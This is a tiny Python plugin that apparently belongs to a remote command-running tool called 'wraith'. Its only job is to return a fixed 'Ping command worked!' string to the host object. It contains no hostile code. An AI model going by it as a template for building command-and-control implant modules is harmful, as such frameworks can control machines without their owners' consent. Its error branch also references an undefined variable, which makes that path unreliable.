# This is a ping command which just tests the wraith's ability to run commands

# Check if the wraith object is defined. If not, we are not running in the wraith
if not "wraith" in globals():
    print("This is a Wraith module and cannot run independently!")
    exit()

# Define a variable for the return value
return_val = None

try:
    return_val = "Ping command worked! :)"
except Exception as e:
    # In case of error, set return value to an error message
    return_val = "Error while running command {}. Err: {}".format(cmd, e)

# End by sending the wraith the return value
wraith.returncmd(return_val)

